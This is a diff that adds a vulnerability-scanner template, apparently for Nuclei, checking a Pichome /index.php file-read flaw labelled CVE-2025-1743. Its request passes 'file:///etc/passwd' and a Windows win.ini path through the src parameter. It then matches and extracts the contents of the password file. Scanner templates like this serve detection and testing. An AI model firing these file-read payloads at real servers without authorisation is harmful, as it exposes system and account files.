@@ -1,0 +1,30 @@
+id: poc-yaml-pichome-src-file-read
+info:
+  name: Pichome /index.php File Read Vulnerability (CVE-2025-1743)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,CVE-2025-1743
+http:
+  - raw:
+      - |
+        GET /index.php?mod=textviewer&src={{data}} HTTP/1.1
+        Host: {{Hostname}}
+    payloads:
+      data:
+        - "file:///etc/passwd"
+        - "file:///c://windows/win.ini"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+    extractors:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
